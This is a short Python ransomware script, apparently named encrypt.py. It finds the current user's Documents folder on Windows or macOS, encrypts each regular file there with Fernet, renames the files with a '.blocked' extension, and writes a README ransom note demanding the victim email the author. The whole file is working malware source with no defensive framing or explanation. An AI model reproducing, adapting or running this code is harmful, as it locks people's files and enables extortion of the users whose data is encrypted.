from asyncore import read
import os
from cryptography.fernet import Fernet

files = []

if os.name == "Windows" or os.name == "nt":
    path = "C:" + chr(92) + "Users" + chr(92) + os.environ.get("USERNAME")+ chr(92) + "Documents" + chr(92)
else:
    path = "/Users/" + os.environ.get('USER')+ "/Documents/"

for file in os.listdir(path):
    if (file != "encrypt.py" and file != "thekey.key" and file != "decrypt.py" and file != ".DS_Store" and file != "decrypt" and file != "decrypt.exe" and file !="encrypt.exe" and file !="encrypt" and file != "README.txt" and os.path.isfile(path + file)):
        if(file.find(".exe") == -1 and file.find(".ini") == -1):
            files.append(file)

print(files)

key = Fernet.generate_key()

with open(path + "thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(path + file, "rb") as thefile:
        content = thefile.read()
    content_encrypted = Fernet(key).encrypt(content)
    with open(path + file, "wb") as thefile:
        thefile.write(content_encrypted)
        
    os.rename(path + file, path + file + ".blocked")

with open(path + "README.txt", "w") as readme:
    readme.write("Your files have been encrypted.\nTo save them contact me -> tomi.serra@gmail.com")
